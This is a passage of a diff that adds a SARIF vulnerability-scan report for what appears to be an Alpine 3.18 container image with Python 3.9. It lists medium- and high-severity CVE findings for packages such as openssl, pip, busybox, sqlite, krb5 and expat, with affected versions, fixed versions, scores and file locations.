+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/etc/ssl/ct_log_list.cnf.dist"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/etc/ssl/misc/CA.pl"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/etc/ssl/misc/tsget.pl"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/etc/ssl/openssl.cnf"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/etc/ssl/openssl.cnf.dist"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/lib/libcrypto.so.3"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/lib/libssl.so.3"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/engines-3/afalg.so"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/engines-3/capi.so"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/engines-3/loader_attic.so"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/engines-3/padlock.so"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/ossl-modules/legacy.so"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2026-3219",
+          "ruleIndex": 4,
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "Vulnerability    :CVE-2026-3219                                                    \nSeverity         :MEDIUM                                                           \nPackage          :pkg:pypi/pip@23.0.1                                              \nAffected range   :<=26.0.1                                                         \nFixed version    :not fixed                                                        \nCVSS Score       :4.6                                                              \nCVSS Vector      :CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:A/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N  \nEPSS Score       :0.000170                                                         \nEPSS Percentile  :0.043090                                                         \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/local/lib/python3.9/site-packages/pip-23.0.1.dist-info/METADATA"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/local/lib/python3.9/site-packages/pip-23.0.1.dist-info/RECORD"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/local/lib/python3.9/site-packages/pip-23.0.1.dist-info/top_level.txt"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2024-0232",
+          "ruleIndex": 5,
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "Vulnerability    :CVE-2024-0232                                                   \nSeverity         :MEDIUM                                                          \nPackage          :pkg:apk/alpine/sqlite@3.41.2-r3?os_name=alpine&os_version=3.18  \nAffected range   :<=3.41.2-r3                                                     \nFixed version    :not fixed                                                       \nEPSS Score       :0.000180                                                        \nEPSS Percentile  :0.048240                                                        \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/lib/apk/db/installed"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/libsqlite3.so.0.8.6"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2024-4603",
+          "ruleIndex": 6,
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "Vulnerability    :CVE-2024-4603                                                   \nSeverity         :MEDIUM                                                          \nPackage          :pkg:apk/alpine/openssl@3.1.4-r5?os_name=alpine&os_version=3.18  \nAffected range   :<3.1.5-r0                                                       \nFixed version    :3.1.5-r0                                                        \nEPSS Score       :0.000920                                                        \nEPSS Percentile  :0.255220                                                        \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/lib/apk/db/installed"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/etc/ssl/ct_log_list.cnf"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/etc/ssl/ct_log_list.cnf.dist"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/etc/ssl/misc/CA.pl"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/etc/ssl/misc/tsget.pl"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/etc/ssl/openssl.cnf"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/etc/ssl/openssl.cnf.dist"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/lib/libcrypto.so.3"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/lib/libssl.so.3"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/engines-3/afalg.so"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/engines-3/capi.so"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/engines-3/loader_attic.so"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/engines-3/padlock.so"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/ossl-modules/legacy.so"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2026-6357",
+          "ruleIndex": 7,
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "Vulnerability    :CVE-2026-6357                                                    \nSeverity         :MEDIUM                                                           \nPackage          :pkg:pypi/pip@23.0.1                                              \nAffected range   :<26.1                                                            \nFixed version    :26.1                                                             \nCVSS Score       :5.3                                                              \nCVSS Vector      :CVSS:4.0/AV:L/AC:L/AT:P/PR:H/UI:A/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N  \nEPSS Score       :0.000160                                                         \nEPSS Percentile  :0.035250                                                         \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/local/lib/python3.9/site-packages/pip-23.0.1.dist-info/METADATA"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/local/lib/python3.9/site-packages/pip-23.0.1.dist-info/RECORD"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/local/lib/python3.9/site-packages/pip-23.0.1.dist-info/top_level.txt"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2023-42363",
+          "ruleIndex": 8,
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "Vulnerability    :CVE-2023-42363                                                   \nSeverity         :MEDIUM                                                           \nPackage          :pkg:apk/alpine/busybox@1.36.1-r5?os_name=alpine&os_version=3.18  \nAffected range   :<1.36.1-r7                                                       \nFixed version    :1.36.1-r7                                                        \nEPSS Score       :0.000260                                                         \nEPSS Percentile  :0.074850                                                         \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/lib/apk/db/installed"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/bin/busybox"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/etc/busybox-paths.d/busybox"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/etc/logrotate.d/acpid"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/etc/network/if-up.d/dad"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/etc/securetty"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/etc/udhcpd.conf"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/bin/ssl_client"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/share/udhcpc/default.script"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2023-42364",
+          "ruleIndex": 9,
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "Vulnerability    :CVE-2023-42364                                                   \nSeverity         :MEDIUM                                                           \nPackage          :pkg:apk/alpine/busybox@1.36.1-r5?os_name=alpine&os_version=3.18  \nAffected range   :<1.36.1-r7                                                       \nFixed version    :1.36.1-r7                                                        \nEPSS Score       :0.000320                                                         \nEPSS Percentile  :0.093520                                                         \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/lib/apk/db/installed"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/bin/busybox"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/etc/busybox-paths.d/busybox"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/etc/logrotate.d/acpid"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/etc/network/if-up.d/dad"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/etc/securetty"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/etc/udhcpd.conf"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/bin/ssl_client"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/share/udhcpc/default.script"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2023-42365",
+          "ruleIndex": 10,
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "Vulnerability    :CVE-2023-42365                                                   \nSeverity         :MEDIUM                                                           \nPackage          :pkg:apk/alpine/busybox@1.36.1-r5?os_name=alpine&os_version=3.18  \nAffected range   :<1.36.1-r7                                                       \nFixed version    :1.36.1-r7                                                        \nEPSS Score       :0.000320                                                         \nEPSS Percentile  :0.093520                                                         \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/lib/apk/db/installed"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/bin/busybox"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/etc/busybox-paths.d/busybox"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/etc/logrotate.d/acpid"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/etc/network/if-up.d/dad"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/etc/securetty"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/etc/udhcpd.conf"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/bin/ssl_client"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/share/udhcpc/default.script"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2023-42366",
+          "ruleIndex": 11,
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "Vulnerability    :CVE-2023-42366                                                   \nSeverity         :MEDIUM                                                           \nPackage          :pkg:apk/alpine/busybox@1.36.1-r5?os_name=alpine&os_version=3.18  \nAffected range   :<1.36.1-r6                                                       \nFixed version    :1.36.1-r6                                                        \nEPSS Score       :0.000240                                                         \nEPSS Percentile  :0.070130                                                         \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/lib/apk/db/installed"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/bin/busybox"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/etc/busybox-paths.d/busybox"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/etc/logrotate.d/acpid"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/etc/network/if-up.d/dad"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/etc/securetty"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/etc/udhcpd.conf"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/bin/ssl_client"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/share/udhcpc/default.script"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2024-2511",
+          "ruleIndex": 12,
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "Vulnerability    :CVE-2024-2511                                                   \nSeverity         :MEDIUM                                                          \nPackage          :pkg:apk/alpine/openssl@3.1.4-r5?os_name=alpine&os_version=3.18  \nAffected range   :<3.1.4-r6                                                       \nFixed version    :3.1.4-r6                                                        \nEPSS Score       :0.090520                                                        \nEPSS Percentile  :0.926970                                                        \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/lib/apk/db/installed"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/etc/ssl/ct_log_list.cnf"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/etc/ssl/ct_log_list.cnf.dist"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/etc/ssl/misc/CA.pl"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/etc/ssl/misc/tsget.pl"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/etc/ssl/openssl.cnf"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/etc/ssl/openssl.cnf.dist"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/lib/libcrypto.so.3"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/lib/libssl.so.3"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/engines-3/afalg.so"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/engines-3/capi.so"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/engines-3/loader_attic.so"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/engines-3/padlock.so"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/ossl-modules/legacy.so"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2024-50602",
+          "ruleIndex": 13,
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "Vulnerability    :CVE-2024-50602                                                \nSeverity         :MEDIUM                                                        \nPackage          :pkg:apk/alpine/expat@2.6.2-r0?os_name=alpine&os_version=3.18  \nAffected range   :<2.6.4-r0                                                     \nFixed version    :2.6.4-r0                                                      \nEPSS Score       :0.001270                                                      \nEPSS Percentile  :0.314150                                                      \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/lib/apk/db/installed"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/libexpat.so.1.9.2"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2025-8869",
+          "ruleIndex": 14,
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "Vulnerability    :CVE-2025-8869                                                    \nSeverity         :MEDIUM                                                           \nPackage          :pkg:pypi/pip@23.0.1                                              \nAffected range   :<=25.2                                                           \nFixed version    :25.3                                                             \nCVSS Score       :5.9                                                              \nCVSS Vector      :CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:A/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N  \nEPSS Score       :0.000210                                                         \nEPSS Percentile  :0.059200                                                         \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/local/lib/python3.9/site-packages/pip-23.0.1.dist-info/METADATA"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/local/lib/python3.9/site-packages/pip-23.0.1.dist-info/RECORD"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/local/lib/python3.9/site-packages/pip-23.0.1.dist-info/top_level.txt"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2024-47611",
+          "ruleIndex": 15,
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "Vulnerability    :CVE-2024-47611                                             \nSeverity         :MEDIUM                                                     \nPackage          :pkg:apk/alpine/xz@5.4.3-r0?os_name=alpine&os_version=3.18  \nAffected range   :<=5.4.3-r0                                                 \nFixed version    :not fixed                                                  \nEPSS Score       :0.003870                                                   \nEPSS Percentile  :0.598930                                                   \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/lib/apk/db/installed"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/liblzma.so.5.4.3"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2023-36054",
+          "ruleIndex": 16,
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "Vulnerability    :CVE-2023-36054                                                \nSeverity         :MEDIUM                                                        \nPackage          :pkg:apk/alpine/krb5@1.20.1-r1?os_name=alpine&os_version=3.18  \nAffected range   :<1.20.2-r0                                                    \nFixed version    :1.20.2-r0                                                     \nEPSS Score       :0.010280                                                      \nEPSS Percentile  :0.774510                                                      \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/lib/apk/db/installed"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/krb5/plugins/kdb/db2.so"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/krb5/plugins/preauth/otp.so"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/krb5/plugins/preauth/spake.so"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/krb5/plugins/preauth/test.so"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/krb5/plugins/tls/k5tls.so"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/libgssapi_krb5.so.2.2"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/libgssrpc.so.4.2"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/libk5crypto.so.3.1"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/libkadm5clnt_mit.so.12.0"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/libkadm5srv_mit.so.12.0"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/libkdb5.so.10.0"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/libkrad.so.0.0"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/libkrb5.so.3.3"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/libkrb5support.so.0.1"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2023-5752",
+          "ruleIndex": 17,
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "Vulnerability    :CVE-2023-5752                                                    \nSeverity         :MEDIUM                                                           \nPackage          :pkg:pypi/pip@23.0.1                                              \nAffected range   :<23.3                                                            \nFixed version    :23.3                                                             \nCVSS Score       :6.8                                                              \nCVSS Vector      :CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N  \nEPSS Score       :0.000750                                                         \nEPSS Percentile  :0.224410                                                         \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/local/lib/python3.9/site-packages/pip-23.0.1.dist-info/METADATA"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/local/lib/python3.9/site-packages/pip-23.0.1.dist-info/RECORD"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/local/lib/python3.9/site-packages/pip-23.0.1.dist-info/top_level.txt"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2026-24049",
+          "ruleIndex": 18,
+          "kind": "fail",
+          "level": "error",
+          "message": {
+            "text": "Vulnerability    :CVE-2026-24049                                \nSeverity         :HIGH                                          \nPackage          :pkg:pypi/wheel@0.43.0                         \nAffected range   :>=0.40.0,<=0.46.1                             \nFixed version    :0.46.2                                        \nCVSS Score       :7.1                                           \nCVSS Vector      :CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:H  \nEPSS Score       :0.000130                                      \nEPSS Percentile  :0.019060                                      \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/local/lib/python3.9/site-packages/wheel-0.43.0.dist-info/METADATA"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/local/lib/python3.9/site-packages/wheel-0.43.0.dist-info/RECORD"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2025-6965",
+          "ruleIndex": 19,
+          "kind": "fail",
+          "level": "error",
+          "message": {
+            "text": "Vulnerability    :CVE-2025-6965                                                   \nSeverity         :HIGH                                                            \nPackage          :pkg:apk/alpine/sqlite@3.41.2-r3?os_name=alpine&os_version=3.18  \nAffected range   :<3.41.2-r4                                                      \nFixed version    :3.41.2-r4                                                       \nEPSS Score       :0.016170                                                        \nEPSS Percentile  :0.819590                                                        \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/lib/apk/db/installed"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/libsqlite3.so.0.8.6"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2024-37370",
+          "ruleIndex": 20,
+          "kind": "fail",
+          "level": "error",
+          "message": {
+            "text": "Vulnerability    :CVE-2024-37370                                                \nSeverity         :HIGH                                                          \nPackage          :pkg:apk/alpine/krb5@1.20.1-r1?os_name=alpine&os_version=3.18  \nAffected range   :<1.20.2-r1                                                    \nFixed version    :1.20.2-r1                                                     \nEPSS Score       :0.005450                                                      \nEPSS Percentile  :0.678890                                                      \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/lib/apk/db/installed"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/krb5/plugins/kdb/db2.so"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/krb5/plugins/preauth/otp.so"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/krb5/plugins/preauth/spake.so"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/krb5/plugins/preauth/test.so"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/krb5/plugins/tls/k5tls.so"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/libgssapi_krb5.so.2.2"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/libgssrpc.so.4.2"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/libk5crypto.so.3.1"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/libkadm5clnt_mit.so.12.0"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/libkadm5srv_mit.so.12.0"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/libkdb5.so.10.0"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/libkrad.so.0.0"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/libkrb5.so.3.3"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/libkrb5support.so.0.1"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2024-45490",
+          "ruleIndex": 21,
+          "kind": "fail",
+          "level": "error",
+          "message": {
+            "text": "Vulnerability    :CVE-2024-45490                                                \nSeverity         :HIGH                                                          \nPackage          :pkg:apk/alpine/expat@2.6.2-r0?os_name=alpine&os_version=3.18  \nAffected range   :<2.6.3-r0                                                     \nFixed version    :2.6.3-r0                                                      \nEPSS Score       :0.006130                                                      \nEPSS Percentile  :0.699680                                                      \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/lib/apk/db/installed"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/libexpat.so.1.9.2"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2024-4741",
+          "ruleIndex": 22,
+          "kind": "fail",
+          "level": "error",
+          "message": {
+            "text": "Vulnerability    :CVE-2024-4741                                                   \nSeverity         :HIGH                                                            \nPackage          :pkg:apk/alpine/openssl@3.1.4-r5?os_name=alpine&os_version=3.18  \nAffected range   :<3.1.6-r0                                                       \nFixed version    :3.1.6-r0                                                        \nEPSS Score       :0.003690                                                        \nEPSS Percentile  :0.588600                                                        \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/lib/apk/db/installed"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/etc/ssl/ct_log_list.cnf"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/etc/ssl/ct_log_list.cnf.dist"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/etc/ssl/misc/CA.pl"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/etc/ssl/misc/tsget.pl"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/etc/ssl/openssl.cnf"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/etc/ssl/openssl.cnf.dist"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/lib/libcrypto.so.3"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/lib/libssl.so.3"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/engines-3/afalg.so"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/engines-3/capi.so"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/engines-3/loader_attic.so"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/engines-3/padlock.so"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
